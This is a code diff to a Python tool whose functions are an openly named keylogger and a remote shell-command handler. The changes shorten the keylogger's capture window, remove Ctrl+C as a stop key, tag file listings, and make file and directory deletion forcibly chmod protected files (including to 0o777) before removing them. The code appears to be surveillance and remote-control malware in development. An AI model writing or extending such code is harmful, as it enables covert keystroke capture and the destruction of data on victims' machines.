@@ -304,14 +304,14 @@ def mimetic_keylogger():
             else:
                 log.append(f'[{key_name.upper()}]')
 
-            if key_name == 'esc' or (event.name == 'c' and keyboard.is_pressed('ctrl')):
+            if key_name == 'esc':
                 stop_event.set()
                 return False
 
         keyboard.on_press(on_key_press)
 
-        # Wait for Ctrl+C/ESC with 60 second timeout
-        stopped = stop_event.wait(timeout=60)
+        # Wait for ESC with 5 second timeout (to match frontend timeout)
+        stopped = stop_event.wait(timeout=5)
         keyboard.unhook_all()
 
         result = ''.join(log)
@@ -529,9 +529,9 @@ def execute_shell_command(cmd_str):
                             else:
                                 size = os.path.getsize(full_path)
                                 size_str = format_size(size)
-                                items.append((item, size_str, ""))
+                                items.append((item, size_str, "[ARC]"))
                         except:
-                            items.append((item, "?", ""))
+                            items.append((item, "?", "[ARC]"))
                 except Exception as e:
                     return f"Error: {str(e)}"
 
@@ -787,9 +787,17 @@ def execute_shell_command(cmd_str):
                     return f"Error: File not found: {filename}"
                 if os.path.isdir(full_path):
                     import shutil
-                    shutil.rmtree(full_path)
+                    import stat
+                    def handle_remove_error(func, path, exc):
+                        if not os.access(path, os.W_OK):
+                            os.chmod(path, stat.S_IWUSR | stat.S_IRUSR | stat.S_IXUSR)
+                            func(path)
+                        else:
+                            raise exc
+                    shutil.rmtree(full_path, onexc=handle_remove_error)
                     return f"Directory deleted: {filename}"
                 else:
+                    os.chmod(full_path, 0o777)
                     os.remove(full_path)
                     return f"File deleted: {filename}"
             except Exception as e:
